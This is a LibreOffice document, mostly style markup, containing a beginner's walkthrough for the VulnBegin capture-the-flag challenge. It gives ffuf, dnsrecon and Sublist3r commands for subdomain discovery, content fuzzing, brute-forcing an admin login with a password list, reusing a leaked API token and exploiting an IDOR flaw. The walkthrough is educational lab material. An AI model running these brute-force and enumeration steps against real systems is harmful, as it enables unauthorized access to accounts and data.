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ing_20_1">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.529cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:line-height="110%" fo:text-align="center" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:color="#ffffff" loext:opacity="100%" style:font-name="inherit" fo:font-size="27pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffffff" loext:opacity="100%" style:font-name="Helvetica Neue" fo:font-size="22.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffffff" loext:opacity="100%" style:font-name="Helvetica Neue" fo:font-size="22.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:paragraph-rsid="000acefd" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="22.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0.529cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:line-height="110%"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="inherit" fo:font-size="22.5pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:paragraph-properties fo:margin-top="0.529cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:line-height="110%"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="inherit" fo:font-size="18pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.529cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:line-height="110%" fo:orphans="2" fo:widows="2" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="18pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#23527c" loext:opacity="100%" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="22.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffffff" loext:opacity="100%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="000acefd" style:font-size-asian="10.5pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P14"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style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:orphans="2" fo:widows="2" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="000acefd"/>
    </style:style>
    <style:style style:name="P18"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style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.529cm" style:contextual-spacing="false" fo:orphans="2" fo:widows="2" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#f5f5f5" loext:padding-left="0.238cm" loext:padding-right="0cm" loext:padding-top="0.238cm" loext:padding-bottom="0.238cm" loext:border-left="0.06pt solid #e3e3e3" loext:border-right="none" loext:border-top="0.06pt solid #e3e3e3" loext:border-bottom="0.06pt solid #e3e3e3"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.529cm" style:contextual-spacing="false"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" fo:background-color="#f5f5f5" loext:padding-left="0.238cm" loext:padding-right="0cm" loext:padding-top="0.238cm" loext:padding-bottom="0.238cm" loext:border-left="0.06pt solid #e3e3e3" loext:border-right="none" loext:border-top="0.06pt solid #e3e3e3" loext:border-bottom="0.06pt solid #e3e3e3"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false" fo:orphans="2" fo:widows="2"/>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.265cm" style:contextual-spacing="false"/>
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#337ab7" loext:opacity="100%" style:text-line-through-style="none" style:text-line-through-type="none" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#337ab7" loext:opacity="100%" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Liberation Mono" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#337ab7" loext:opacity="100%" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="Liberation Mono" fo:font-size="10.5pt" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent" loext:char-shading-value="0" style:font-size-asian="10.5pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties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ffffff" loext:opacity="100%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#337ab7" loext:opacity="100%"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T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none"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T9" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%" style:font-name="Helvetica Neue" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:use-window-font-color="true" loext:opacity="0%"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T11" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:text-line-through-style="none" style:text-line-through-type="none" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" officeooo:rsid="000acefd"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" fo:font-weight="normal" officeooo:rsid="000acefd" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Liberation Mono"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Liberation Mono" fo:font-size="10.5pt" style:font-size-asian="10.5pt" style:font-size-complex="10.5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h text:style-name="P3" text:outline-level="2"><text:span text:style-name="T13">How To Begin (</text:span><text:span text:style-name="T14">with VulnBegin)</text:span></text:h>
      <text:p text:style-name="P17"><text:span text:style-name="T16">This "How to Begin" document will guide your through the challenge </text:span><text:a xlink:type="simple" xlink:href="https://ctfchallenge.co.uk/6" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T3">VulnBegin</text:span></text:a></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T11">The majority of the challenges can be completed with just a few open-source tools and a web browser. This guide requires access to a Linux computer with permissions to run as the root user. If you don't currently have this I strongly recommend </text:span><text:a xlink:type="simple" xlink:href="https://m.do.co/c/be75f966a8a9" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T1">Digital Ocean</text:span></text:a><text:span text:style-name="T11">, if you use this link you will be given $100 worth of credit to use over 60 days. You just need to spin up an ubuntu droplet ( a $5 per month one will be fine ).<text:line-break/>The tools we require are ffuf, dnsrecon and sublist3r. If you have a kali Linux install already you will already have access to these tools and you can skip the installation steps below.</text:span></text:p>
      <text:h text:style-name="P2" text:outline-level="2"><text:span text:style-name="T11">Installation</text:span></text:h>
      <text:h text:style-name="P7" text:outline-level="3">Go and Python</text:h>
      <text:p text:style-name="P15"><text:span text:style-name="T9">Both </text:span><text:a xlink:type="simple" xlink:href="https://golang.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">Go</text:span></text:a><text:span text:style-name="T9"> and </text:span><text:a xlink:type="simple" xlink:href="https://www.python.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">Python</text:span></text:a><text:span text:style-name="T9"> languages need to be installed for the following tools to install and run</text:span></text:p>
      <text:p text:style-name="P19">sudo add-apt-repository -y ppa:longsleep/golang-backports<text:line-break/>sudo apt update<text:line-break/>sudo apt install golang-go python python-pip</text:p>
      <text:h text:style-name="P7" text:outline-level="3">FFUF</text:h>
      <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="https://github.com/ffuf/ffuf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">FFUF</text:span></text:a><text:span text:style-name="T9"> is an excellent tool created by </text:span><text:a xlink:type="simple" xlink:href="https://github.com/joohoi" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">Joona Hoikkala</text:span></text:a><text:span text:style-name="T9"> which can be used for web content discovery, parameter discovery and fuzzing, virtual hosting discovery, brute forcing and more</text:span></text:p>
      <text:p text:style-name="P19">cd ~<text:line-break/>go get github.com/ffuf/ffuf<text:line-break/>sudo ln -s ~/go/bin/ffuf /usr/sbin/ffuf</text:p>
      <text:h text:style-name="P7" text:outline-level="3">Sublist3r</text:h>
      <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="https://github.com/aboul3la/Sublist3r" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">Sublist3r</text:span></text:a><text:span text:style-name="T9"> is a python tool created by </text:span><text:a xlink:type="simple" xlink:href="https://github.com/aboul3la/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T10">Ahmed Aboul-Ela</text:span></text:a><text:span text:style-name="T9"> designed to enumerate subdomains of websites using OSINT. It uses search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>cd ~<text:line-break/>git clone https://github.com/aboul3la/Sublist3r.git<text:line-break/>cd Sublist3r<text:line-break/>sudo pip install -r requirements.txt<text:line-break/>sudo ln -s ~/Sublist3r/sublist3r.py /usr/sbin/sublist3r</text:p>
      <text:p text:style-name="P10"/>
      <text:h text:style-name="P4" text:outline-level="2">Begin</text:h>
      <text:p text:style-name="P14">I'll assume you now have a working linux install with the above tools and dictionaries/SecLists installed. If you have alternative tools or operating system you will need to amend the below examples to suit your requirements.</text:p>
      <text:h text:style-name="P7" text:outline-level="3">DNS Recon</text:h>
      <text:p text:style-name="P14">Our first task is to discover as many subdomains for vulnbegin.co.uk as possible</text:p>
      <text:p text:style-name="P19">dnsrecon -n 8.8.8.8 -d vulnbegin.co.uk</text:p>
      <text:p text:style-name="P14">The above tool will query the DNS server for any public A,AAAA,TXT,NS,SOA,SPF and more records. You will see from the results there is a TXT record with a flag.</text:p>
      <text:p text:style-name="P19">sublist3r -d vulnbegin.co.uk</text:p>
      <text:p text:style-name="P14">The above query uses OSINT to discover domain names from various search engines and other data resources, from the result you will find an obscure subdomain if you visit it this will show you a flag</text:p>
      <text:p text:style-name="P19">dnsrecon -d vulnbegin.co.uk -D /root/wordlists/namelist.txt -t brt</text:p>
      <text:p text:style-name="P14">This last DNS recon command uses a brute force attack with a dictionary of common subdomains against the DNS Server to try and find results. You will find server.vulnbegin.co.uk if you view this domain you will see some JSON output with a flag.</text:p>
      <text:h text:style-name="P7" text:outline-level="3">Content Discovery</text:h>
      <text:p text:style-name="P14">Now we're going to try and find some content on the main website www.vulnbuild.co.uk as when browing the website it appears to only have one page with some css and js files</text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>ffuf -w ~/wordlists/common.txt -u http://www.vulnbegin.co.uk/FUZZ</text:p>
      <text:p text:style-name="P14">The above command starts scanning the root directory of the website for all the files and folders in the common.txt file and reveals the following files:</text:p>
      <text:list xml:id="list1346397671" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P21">/css</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">/js</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">/robots.txt</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">/cpadmin</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14">The /css and /js folders do not have directory listing enabled so we can't find any other files. Inspecting the /robots.txt file we disscover a secret directory that the website owner doesn't want to be listed in search engines. Looking in this directory reveals another flag</text:p>
      <text:p text:style-name="P14">Viewing http://www.vulnbegin.co.uk/cpadmin redirects http://www.vulnbegin.co.uk/cpadmin/login and presents a login screen</text:p>
      <text:p text:style-name="P14">Trying some standard default username and passwords reveals that when you enter an invalid username you are presented with "Username is invalid" but when you guess a correct username you receive the message "Password is invalid"</text:p>
      <text:p text:style-name="P19">ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&amp;password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all</text:p>
      <text:p text:style-name="P14">The above command launches a brute force attack against the login script using the top 100 passwords dictionary, the application returns a 200 HTTP STATUS whether the login was valid or invalid</text:p>
      <text:p text:style-name="P19">ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&amp;password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200</text:p>
      <text:p text:style-name="P14">I re-ran the script but this time with the "-fc 200" filter code swtich to remove 200 responses from the results. You can now see the successful login with the password that is required. When logging in using the browser you can find your next flag and a dashboard</text:p>
      <text:p text:style-name="P19">ffuf -w ~/wordlists/common.txt -b "token=xxxxxxxxxxxxxxxxx" -u http://www.vulnbegin.co.uk/cpadmin/FUZZ</text:p>
      <text:p text:style-name="P14">Now we have access to that directory I ran the content discovery script again but this time with the cookie I was given, this reveals a configuration file with a flag and also an API key</text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>curl -H "X-Token: XXXXXXXXXXXXXXXXXXXXXXXXX" http://server.vulnbegin.co.uk</text:p>
      <text:p text:style-name="P18">Performing a curl request using the API key that we found against server.vulnbegin.co.uk shows that we are authenticated and reveals another flag.</text:p>
      <text:p text:style-name="P19">ffuf -w ~/wordlists/common.txt -H "X-Token: XXXXXXXXXXXXXXXXXXXXXXXX" -u http://server.vulnbegin.co.uk/FUZZ</text:p>
      <text:p text:style-name="P14">Going back to ffuf we again try and discover content on server.vulnbegin.co.uk but also use the X-Token header, which discovers the /user endpoint. This endpoint reveals another flag and also a link to another endpoint /user/27</text:p>
      <text:p text:style-name="P19">for ((i=1;i&lt;=1000;i++)); do echo $i &gt;&gt; ~/wordlists/1-1000.txt; done<text:line-break/>ffuf -w ~/wordlists/1-1000.txt -H "X-Token: XXXXXXXXXXXXXXXXXXXXXXXxXXX" -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404</text:p>
      <text:p text:style-name="P14">Now we check for possible IDOR vulnerabilities by changing the id at the end of the request. First we need to make a text file with just the numbers 1-1000 to use.</text:p>
      <text:p text:style-name="P14">Then we use ffuf to scan the /user end point for other id's making sure we match any HTTP status but filter out 404 statuses</text:p>
      <text:p text:style-name="P14">This reveals ID 5 but we do not have permission to view it</text:p>
      <text:p text:style-name="P19">curl -H "X-Token: XXXXXXXXXXXXXXXXXXXXXXXXX" http://server.vulnbegin.co.uk/user/27</text:p>
      <text:p text:style-name="P14">We check the above end point and it displays user information and also reveals another endpoint of /user/27/info which shows a bit more information about the user</text:p>
      <text:p text:style-name="P14">From the previous ffuf scan we know that ID 5 is a valid user to we try the below command</text:p>
      <text:p text:style-name="P19">curl -H "X-Token: XXXXXXXXXXXXXXXXXXXXXXXXX" http://server.vulnbegin.co.uk/user/5/info</text:p>
      <text:p text:style-name="P14">It's a success, the developer mustn't of protected this endpoint and authenticated the user properly thus creating an IDOR vulnerability. You can now collect your last flag.</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Neue" svg:font-family="'Helvetica Neue', Helvetica, Arial, sans-serif"/>
    <style:font-face style:name="inherit" svg:font-family="inherit"/>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Bitstream Vera Sans"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Bitstream Vera Sans" style:font-family-complex="'Bitstream Ver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1T07:06:02.473572134</meta:creation-date>
    <dc:date>2020-10-01T07:37:13.535190715</dc:date>
    <meta:editing-duration>PT50S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="53" meta:word-count="1001" meta:character-count="6619" meta:non-whitespace-character-count="5675"/>
    <meta:generator>LibreOffice/7.0.1.2$Linux_X86_64 LibreOffice_project/00$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>